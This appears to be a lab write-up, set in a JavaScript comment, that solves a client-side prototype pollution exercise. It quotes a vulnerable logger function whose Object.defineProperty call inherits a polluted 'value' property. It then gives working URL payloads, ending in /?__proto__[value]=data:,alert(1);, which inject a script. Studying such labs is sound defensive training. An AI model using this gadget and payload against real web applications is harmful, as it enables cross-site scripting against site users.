/*


1) Find a source that you can use to add arbitrary properties to the global Object.prototype.
// look at the source code
//searchLoggerConfigurable.js

async function searchLogger() {
    // create config object with URL query parameters 
    // its transport_url property is set to false
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    // transport_url is non-configurable, non writable
    // {configurable: false, writable: false} is the options object/ descriptor
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}


2) Identify a gadget property that allows you to execute arbitrary JavaScript.

/?__proto__[foo]=foo

>> Object.prototype
Object { foo: "foo", … }


transport_url is not having a value property

/?__proto__[value]=bob
// this adds a script tag with bob in the source 
<script src="bob"></script>

3) Combine these to call alert().
/?__proto__[value]=data:,alert(1);


In a data URI scheme, the comma (,) is used to separate the MIME type (or media type) from the data itself
So, when you see data:,alert(1);, here's how it's broken down:

<media type> is omitted, making the MIME type blank.

;base64 is omitted.

<data> is the JavaScript code alert(1);




*/